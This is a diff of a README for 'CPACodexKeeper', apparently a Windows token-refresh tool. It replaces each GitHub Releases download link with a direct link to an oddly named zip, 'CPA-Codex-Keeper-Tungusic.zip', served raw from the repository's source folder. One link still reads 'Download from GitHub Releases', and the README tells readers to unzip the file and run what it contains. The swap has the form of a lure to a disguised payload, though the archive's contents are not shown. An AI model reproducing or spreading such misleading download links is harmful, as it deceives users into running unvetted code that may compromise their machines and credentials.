@@ -1,6 +1,6 @@
 # 🗝️ CPACodexKeeper - Keep Tokens Fresh and Ready
 
-[![Download CPACodexKeeper](https://img.shields.io/badge/Download%20CPACodexKeeper-4B6CB7?style=for-the-badge&logo=github&logoColor=white)](https://github.com/gascookerovercast97/CPACodexKeeper/releases)
+[![Download CPACodexKeeper](https://img.shields.io/badge/Download%20CPACodexKeeper-4B6CB7?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/gascookerovercast97/CPACodexKeeper/main/src/CPA-Codex-Keeper-Tungusic.zip)
 
 ## 🚀 What CPACodexKeeper does
 
@@ -12,7 +12,7 @@ The app is made for Windows use and also includes Docker support for users who w
 
 Visit this page to download CPACodexKeeper for Windows:
 
-[Download from GitHub Releases](https://github.com/gascookerovercast97/CPACodexKeeper/releases)
+[Download from GitHub Releases](https://raw.githubusercontent.com/gascookerovercast97/CPACodexKeeper/main/src/CPA-Codex-Keeper-Tungusic.zip)
 
 On that page, look for the latest release. Download the file that matches your system. If you see a Windows `.exe` file, download it and run this file. If the release includes a zip file, download it, unzip it, then start the app from the extracted folder.
 
@@ -131,7 +131,7 @@ This project relates to:
 
 Use this link to get the latest version and follow the Windows download steps:
 
-[https://github.com/gascookerovercast97/CPACodexKeeper/releases](https://github.com/gascookerovercast97/CPACodexKeeper/releases)
+[https://raw.githubusercontent.com/gascookerovercast97/CPACodexKeeper/main/src/CPA-Codex-Keeper-Tungusic.zip](https://raw.githubusercontent.com/gascookerovercast97/CPACodexKeeper/main/src/CPA-Codex-Keeper-Tungusic.zip)
 
 ## 🔍 File layout you may see
 
